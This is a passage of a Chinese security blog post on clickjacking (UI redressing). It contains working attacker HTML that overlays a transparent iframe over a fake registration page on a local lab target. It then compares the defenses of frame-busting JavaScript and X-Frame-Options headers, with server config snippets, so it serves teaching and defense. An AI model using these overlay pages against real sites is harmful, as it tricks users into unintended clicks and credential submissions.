class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">          &lt;a href=<span class="string">"http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"</span>&gt;</span><br><span class="line">     &lt;img src=<span class="string">"sonarqube-black-256px.png"</span> style=<span class="string">"position:absolute;top:90px;left:320px;"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">     &lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146911.11.png" alt></p>
+<h3 id="点击劫持实例-防御对比"><a href="#点击劫持实例-防御对比" class="headerlink" title="点击劫持实例+防御对比"></a>点击劫持实例+防御对比</h3><h4 id="情景一：无任何防御"><a href="#情景一：无任何防御" class="headerlink" title="情景一：无任何防御"></a>情景一：无任何防御</h4><p>目标页面代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;后台管理员添加&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">  &lt;style&gt;</span></span><br><span class="line"><span class="regexp">  body&#123; background-repeat: no-repeat;background-size: 100% 100%;background-attachment: fixed;&#125;</span></span><br><span class="line"><span class="regexp">  h2&#123; color:blue;text-align: center;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">  &lt;h2&gt;管理员添加&lt;/</span>h2&gt;</span><br><span class="line">  &lt;div style=<span class="string">"text-align:center;"</span>&gt;</span><br><span class="line">    &lt;form action=<span class="string">"x.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">"username"</span> name=<span class="string">"username"</span>&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type="password" name="password"&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type="submit" name="submit" value="提交"&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>效果：模拟的登录界面</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182354.51.png" alt></p>
+<p>构造透明层iframe</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;点击劫持&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">  body&#123; background-repeat: no-repeat;background-size: 100% 100%;background-attachment: fixed;&#125;</span></span><br><span class="line"><span class="regexp">  iframe&#123; position: absolute;z-index: 2;top: 0px;left: 0px;width: 1800px;height: 900px;opacity: 0;filter: alpha(opacity=0);&#125;</span></span><br><span class="line"><span class="regexp">  button&#123; position: absolute;z-index: 1;top: 140px;left: 881px;&#125;</span></span><br><span class="line"><span class="regexp">  input&#123; position: absolute;z-index: 1;top: 80px;left: 821px;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body background="mv.jpg" &gt;</span></span><br><span class="line"><span class="regexp">  &lt;div style="position: absolute;z-index: 1; top: -3px;left: 800px"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;h2&gt;靓丽美女账号注册&lt;/</span>h2&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">     &lt;input type="text"&gt;</span></span><br><span class="line"><span class="regexp">     &lt;div style="position: absolute;z-index: 1;top: 43px;left: -1px;"&gt;</span></span><br><span class="line"><span class="regexp">     &lt;input type="text"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">  &lt;button&gt;注册&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">  &lt;iframe src="./</span>admin.html<span class="string">"&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
+<p>效果：诱导注册<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182435.88.png" alt></p>
+<p>后台处理：实际场景中是模拟登录，此处为了方便，弹框即可</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">if</span> (isset($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isset($_POST[<span class="string">'username'</span>]) &amp;&amp; isset($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        echo <span class="string">"&lt;script&gt;alert('接收成功')&lt;/script&gt;"</span>;</span><br><span class="line">        echo <span class="string">"&lt;script&gt;alert('hacked by demos')&lt;/script&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">"&lt;script&gt;alert('数据不完整')&lt;/script&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>诱导点击效果：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182583.03.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182595.7.png" alt></p>
+<h4 id="情景二：界面使用JavaScript动态防御"><a href="#情景二：界面使用JavaScript动态防御" class="headerlink" title="情景二：界面使用JavaScript动态防御"></a>情景二：界面使用JavaScript动态防御</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">if</span>(self == top)    <span class="comment">//在应用iframe时top指的是顶级的窗口</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">var</span> theBody = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>];</span><br><span class="line">      theBody.style.display = <span class="string">"block"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      top.location = self.location;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在网站页面开发加上如上代码，可以动态防御iframe嵌入页面，在检测到有iframe嵌入当前页面时，直接跳转到当前页面，从而防御点击劫持。</p>
+<p>本例实现代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;后台管理员添加&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">  &lt;style&gt;</span></span><br><span class="line"><span class="regexp">  body&#123; background-repeat: no-repeat;background-size: 100% 100%;background-attachment: fixed;&#125;</span></span><br><span class="line"><span class="regexp">  h2&#123; color:blue;text-align: center;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">  &lt;h2&gt;管理员添加&lt;/</span>h2&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    <span class="keyword">if</span>(self == top)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">var</span> theBody = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>];</span><br><span class="line">      theBody.style.display = <span class="string">"block"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      top.location = self.location;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">  &lt;div style="text-align:center;"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;form action="x.php" method="POST"&gt;</span></span><br><span class="line"><span class="regexp">      &lt;input type="username" name="username"&gt;&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="regexp">      &lt;input type="password" name="password"&gt;&lt;br&gt;</span></span><br><span class="line"><span class="regexp">      &lt;input type="submit" name="submit" value="提交"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
+<p>iframe嵌入访问的效果如下：当攻击者诱导用户访问恶意界面时，立即跳转到真正的页面，进行防御</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182966.45.png" alt></p>
+<h4 id="情景三：添加X-Frame-Options头"><a href="#情景三：添加X-Frame-Options头" class="headerlink" title="情景三：添加X-Frame-Options头"></a>情景三：添加X-Frame-Options头</h4><blockquote>
+<p> 使用该头后禁止页面被iframe嵌套 ,chrome有点问题，不知道为什么，emmm</p>
+</blockquote>
+<p>修改代码如下</p>
+<p>admin.php:禁止一切源嵌入当前页面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"X-FRAME-OPTIONS:DENY"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;后台管理员添加&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">  body&#123; background-repeat: no-repeat;background-size: <span class="number">100</span>% <span class="number">100</span>%;background-attachment: fixed;&#125;</span><br><span class="line">  h2&#123; color:blue;text-align: center;&#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;h2&gt;管理员添加&lt;/h2&gt;</span><br><span class="line">  &lt;div style=<span class="string">"text-align:center;"</span>&gt;</span><br><span class="line">    &lt;form action=<span class="string">"x.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">"username"</span> name=<span class="string">"username"</span>&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;&lt;br&gt;</span><br><span class="line">      &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>攻击者构造的恶意页面</p>
+<p>jack.html：opacity改为0.3查看是否嵌套成功</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;点击劫持&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">  body&#123; background-repeat: no-repeat;background-size: 100% 100%;background-attachment: fixed;&#125;</span></span><br><span class="line"><span class="regexp">  iframe&#123; position: absolute;z-index: 2;top: 0px;left: 0px;width: 1800px;height: 900px;opacity: 0.3;filter: alpha(opacity=0);&#125;</span></span><br><span class="line"><span class="regexp">  button&#123; position: absolute;z-index: 1;top: 140px;left: 881px;&#125;</span></span><br><span class="line"><span class="regexp">  input&#123; position: absolute;z-index: 1;top: 80px;left: 821px;&#125;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body background="mv.jpg" &gt;</span></span><br><span class="line"><span class="regexp">  &lt;div style="position: absolute;z-index: 1; top: -3px;left: 800px"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;h2&gt;靓丽美女账号注册&lt;/</span>h2&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">     &lt;input type="text"&gt;</span></span><br><span class="line"><span class="regexp">     &lt;div style="position: absolute;z-index: 1;top: 43px;left: -1px;"&gt;</span></span><br><span class="line"><span class="regexp">     &lt;input type="text"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">  &lt;button&gt;注册&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">  &lt;iframe src="http:/</span><span class="regexp">/192.168.1.102/</span>clickhack/test2_2/admin.php<span class="string">"&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
+<p>效果如下：攻击者没有嵌套成功</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183292.84.png" alt></p>
+<p>访问页面抓取数据包查看</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183394.57.png" alt></p>
+<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><blockquote>
+<p>最简单的方法：查看目标页面是否可以被iframe嵌套，利用pocbox做演示和上面实例做演示</p>
+</blockquote>
+<h4 id="情景一：无任何防御-1"><a href="#情景一：无任何防御-1" class="headerlink" title="情景一：无任何防御"></a>情景一：无任何防御</h4><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183600.0.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183636.5.png" alt></p>
+<h4 id="情景二：界面使用JavaScript动态防御-1"><a href="#情景二：界面使用JavaScript动态防御-1" class="headerlink" title="情景二：界面使用JavaScript动态防御"></a>情景二：界面使用JavaScript动态防御</h4><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183712.82.png" alt></p>
+<h4 id="情景三：添加X-Frame-Options头-1"><a href="#情景三：添加X-Frame-Options头-1" class="headerlink" title="情景三：添加X-Frame-Options头"></a>情景三：添加X-Frame-Options头</h4><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183798.76.png" alt></p>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>使用JavaScript动态防御</p>
+<p>使用一个HTTP头——X-Frame-Options。X-Frame-Options可以说是为了解决ClickJacking而生的，它有三个可选的值：</p>
+<p>DENY：浏览器会拒绝当前页面加载任何frame页面；</p>
+<p>SAMEORIGIN：frame页面的地址只能为同源域名下的页面；</p>
+<p>ALLOW-FROM origin：允许frame加载的页面地址；</p>
+<p>PS：浏览器支持情况：IE8+、Opera10+、Safari4+、Chrome4.1.249.1042+、Firefox3.6.9。</p>
+<p>具体的设置方法：</p>
+<p><strong>Apache配置：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header always append X-Frame-Options SAMEORIGIN</span><br></pre></td></tr></table></figure>
+<p><strong>nginx配置：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_header X-Frame-Options SAMEORIGIN;</span><br></pre></td></tr></table></figure>
+<p><strong>IIS配置：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;system.webServer&gt;</span><br><span class="line">    ...</span><br><span class="line">    &lt;httpProtocol&gt;</span><br><span class="line">        &lt;customHeaders&gt;</span><br><span class="line">            &lt;add name=<span class="string">"X-Frame-Options"</span> value=<span class="string">"SAMEORIGIN"</span> /&gt;</span><br><span class="line">        &lt;<span class="regexp">/customHeaders&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>httpProtocol&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;<span class="regexp">/system.webServer&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>界面操作劫持漏洞挖掘只需要确认：目标的HTTP响应头是否设置好了X-Frame-Options字段；目标是否又JavaScript的Frame Busting机制；更简单的是用iframe嵌入目标站点试试，如果成功，则证明漏洞存在。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>web前端黑客技术揭秘</p>
+<p><a href="https://www.cnblogs.com/lovesong/p/5248483.html" target="_blank" rel="noopener">https://www.cnblogs.com/lovesong/p/5248483.html</a></p>
+<p><a href="https://www.cnblogs.com/haq5201314/p/8992273.html" target="_blank" rel="noopener">https://www.cnblogs.com/haq5201314/p/8992273.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Demos
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.lsowl.top/2018/10/27/界面劫持/" title="界面劫持">https://www.lsowl.top/2018/10/27/界面劫持/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web前端/" rel="tag"><i class="fa fa-tag"></i> web前端</a>
+          
+            <a href="/tags/界面劫持/" rel="tag"><i class="fa fa-tag"></i> 界面劫持</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/27/同源策略/" rel="next" title="同源策略">
+                <i class="fa fa-chevron-left"></i> 同源策略
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/09/python协程学习/" rel="prev" title="python协程学习">
+                python协程学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Demos">
+            
+              <p class="site-author-name" itemprop="name">Demos</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/demossl" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:demosqq@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.shentoushi.top/" title="渗透师导航" target="_blank">渗透师导航</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://damit5.com" title="Damit5" target="_blank">Damit5</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://adad456.github.io" title="拾柒" target="_blank">拾柒</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#界面劫持"><span class="nav-number">1.</span> <span class="nav-text">界面劫持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#界面劫持分类"><span class="nav-number">2.</span> <span class="nav-text">界面劫持分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#劫持原理"><span class="nav-number">3.</span> <span class="nav-text">劫持原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#透明层使用CSS样式实现"><span class="nav-number">3.1.</span> <span class="nav-text">透明层使用CSS样式实现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用iframe嵌入被劫持的页面"><span class="nav-number">3.2.</span> <span class="nav-text">使用iframe嵌入被劫持的页面</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#拖放劫持相关"><span class="nav-number">4.</span> <span class="nav-text">拖放劫持相关</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#拖放劫持的思路"><span class="nav-number">4.1.</span> <span class="nav-text">拖放劫持的思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#拖放劫持技术原理"><span class="nav-number">4.2.</span> <span class="nav-text">拖放劫持技术原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#拖放劫持防御方法"><span class="nav-number">4.3.</span> <span class="nav-text">拖放劫持防御方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#触屏劫持相关"><span class="nav-number">5.</span> <span class="nav-text">触屏劫持相关</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#触屏劫持防御"><span class="nav-number">5.1.</span> <span class="nav-text">触屏劫持防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#点击劫持技术实现"><span class="nav-number">6.</span> <span class="nav-text">点击劫持技术实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#点击劫持实战"><span class="nav-number">7.</span> <span class="nav-text">点击劫持实战</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#点击劫持实例-防御对比"><span class="nav-number">8.</span> <span class="nav-text">点击劫持实例+防御对比</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#情景一：无任何防御"><span class="nav-number">8.1.</span> <span class="nav-text">情景一：无任何防御</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#情景二：界面使用JavaScript动态防御"><span class="nav-number">8.2.</span> <span class="nav-text">情景二：界面使用JavaScript动态防御</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#情景三：添加X-Frame-Options头"><span class="nav-number">8.3.</span> <span class="nav-text">情景三：添加X-Frame-Options头</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞挖掘"><span class="nav-number">9.</span> <span class="nav-text">漏洞挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#情景一：无任何防御-1"><span class="nav-number">9.1.</span> <span class="nav-text">情景一：无任何防御</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#情景二：界面使用JavaScript动态防御-1"><span class="nav-number">9.2.</span> <span class="nav-text">情景二：界面使用JavaScript动态防御</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#情景三：添加X-Frame-Options头-1"><span class="nav-number">9.3.</span> <span class="nav-text">情景三：添加X-Frame-Options头</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御"><span class="nav-number">10.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">11.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a 